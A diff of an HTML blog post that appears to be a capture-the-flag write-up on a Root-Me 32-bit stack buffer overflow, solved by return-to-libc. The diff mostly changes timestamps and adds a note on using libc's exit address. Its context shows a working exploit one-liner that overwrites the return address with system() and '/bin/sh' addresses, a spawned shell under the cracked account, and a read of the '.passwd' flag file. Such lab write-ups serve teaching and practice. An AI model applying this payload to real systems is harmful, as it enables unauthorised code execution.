@@ -34,7 +34,7 @@
 <meta property="og:description" content="ELF x86 - Stack buffer overflow basic 6return to libc 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;sys&#x2F;types.h&gt;#include &lt;unistd.h&gt; int main (int ar">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-12-31T06:08:34.000Z">
-<meta property="article:modified_time" content="2020-12-31T06:24:17.481Z">
+<meta property="article:modified_time" content="2020-12-31T06:36:36.193Z">
 <meta property="article:author" content="finsenty54">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
@@ -336,7 +336,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2020-12-31 14:08:34 / 修改时间：14:24:17" itemprop="dateCreated datePublished" datetime="2020-12-31T14:08:34+08:00">2020-12-31</time>
+      <time title="创建时间：2020-12-31 14:08:34 / 修改时间：14:36:36" itemprop="dateCreated datePublished" datetime="2020-12-31T14:08:34+08:00">2020-12-31</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -377,7 +377,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>5.6k</span>
+      <span>5.7k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -443,7 +443,7 @@ Searching for &#39;/bin/sh&#39; in range: 0xb7e27000 - 0xb7fd6000
 Found 1 results, display max 1 items:
 libc.so.6 : 0xb7f8ad4c (&quot;/bin/sh&quot;)</code></pre>
 <p>或者<br><code>gdb-peda$ find &quot;/bin/sh&quot;</code></p>
-<p>成功，中间exit()不用连接也可以</p>
+<p>成功，中间exit()不用连接也可以<br>for exiting without segmentation fault, it’s necessary to replace the ‘DDDD’ with a valid address (e.g address to libc’s exit function).<br>需要退出没有段报错，将DDDD用exit替换</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app-systeme-ch33@challenge02:~$ ./ch33 $(python -c <span class="string">&quot;print &#x27;a&#x27;*32+&#x27;\x10\x83\xe6\xb7&#x27;+&#x27;AAAA&#x27;+&#x27;\x4c\xad\xf8\xb7&#x27;&quot;</span>)</span><br><span class="line">Your message: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaƒæ·AAAAL­ø·</span><br><span class="line">$ id</span><br><span class="line">uid=1233(app-systeme-ch33-cracked) gid=1133(app-systeme-ch33) groups=1133(app-systeme-ch33),100(users)</span><br><span class="line">$ cat .passwd</span><br></pre></td></tr></table></figure>
 
 
